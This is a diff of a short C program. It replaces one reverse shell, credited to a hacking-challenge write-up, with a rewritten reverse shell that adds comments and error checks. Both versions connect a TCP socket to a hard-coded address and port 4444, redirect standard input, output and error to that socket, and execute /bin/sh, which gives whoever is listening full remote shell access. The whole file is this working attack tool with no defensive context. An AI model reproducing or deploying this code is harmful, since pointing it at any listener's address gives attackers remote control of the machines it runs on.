@@ -1,29 +1,44 @@
-/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
-#include <stdio.h>
-#include <unistd.h>
+/* Simple Linux Base Reverse shell written in c */ 
 #include <netinet/in.h>
-#include <sys/types.h>
-#include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
 #include <sys/socket.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
 
 #define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 4444
 
-int main(int argc, char *argv[])
+
+int main()
 {
-    struct sockaddr_in sa;
-    int s;
+	// Create addr struct
+	struct sockaddr_in addr;
+	addr.sin_family = AF_INET;
 
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-    sa.sin_port = htons(REMOTE_PORT);
+	addr.sin_port = htons(REMOTE_PORT);	// Connection Port
+	addr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);	// Connection IP
 
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (struct sockaddr *)&sa, sizeof(sa));
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
+	// Create socket
+	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (sock == -1) {
+		perror("Socket creation failed.\n");
+		exit(EXIT_FAILURE);
+	}
 
-    execve("/bin/sh", 0, 0);
-    return 0;
+	// Connect socket
+	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
+		perror("Socket connection failed.\n");
+		close(sock);
+		exit(EXIT_FAILURE);
+	}
+
+	// Duplicate stdin, stdout, stderr to socket
+	dup2(sock, 0);
+	dup2(sock, 1);
+	dup2(sock, 2);
+
+	//Execute shell
+	execve("/bin/sh", 0, 0);
 }
